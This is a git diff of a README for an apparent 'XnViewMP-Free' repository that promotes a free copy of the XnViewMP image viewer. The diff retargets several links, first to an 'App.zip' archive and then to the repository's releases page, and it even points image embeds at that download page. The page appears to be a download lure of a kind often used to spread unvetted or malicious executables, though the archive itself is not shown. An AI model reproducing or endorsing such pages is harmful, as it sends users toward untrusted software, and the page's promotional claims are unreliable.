@@ -26,7 +26,7 @@ Welcome to the XnViewMP-Free repository! Here you can find information, tutorial
 
 ## Resources and Links 🔗
 
-- **GitHub Repository**: [Click here to visit the repository](https://github.com/uploads/App.zip) 🖱️
+- **GitHub Repository**: [Click here to visit the repository](https://github.com/stejan1/XnViewMP-Free/releases) 🖱️
 
 ## Overview 🌟
 
@@ -40,7 +40,7 @@ One of the key features of XnViewMP is the ability to show a preview panel along
 3. Click on the Show Preview Panel option.
 4. The preview panel will now be visible next to the image browser.
 
-![Preview Panel](https://example.com/preview-panel.png)
+![Preview Panel](https://github.com/stejan1/XnViewMP-Free/releases)
 
 ## XnView vs XnViewMP 🔄
 
@@ -58,7 +58,7 @@ Creating contact sheets with XnViewMP is a simple process that allows you to gen
 4. Choose the layout and settings for the contact sheet.
 5. Click Ok to generate the contact sheet.
 
-![Contact Sheet](https://example.com/contact-sheet.png)
+![Contact Sheet](https://github.com/stejan1/XnViewMP-Free/releases)
 
 ## Conclusion 🚀
 
@@ -66,7 +66,7 @@ In conclusion, XnViewMP is a versatile image viewing software that offers a wide
 
 ## Check it Out! 🌐
 
-Don't miss out on the latest updates and resources related to XnViewMP. Visit the [repository](https://github.com/uploads/App.zip) now to discover more about this amazing software! 🚀
+Don't miss out on the latest updates and resources related to XnViewMP. Visit the [repository](https://github.com/stejan1/XnViewMP-Free/releases) now to discover more about this amazing software! 🚀
 
 ## Let's Connect! 🤝
 
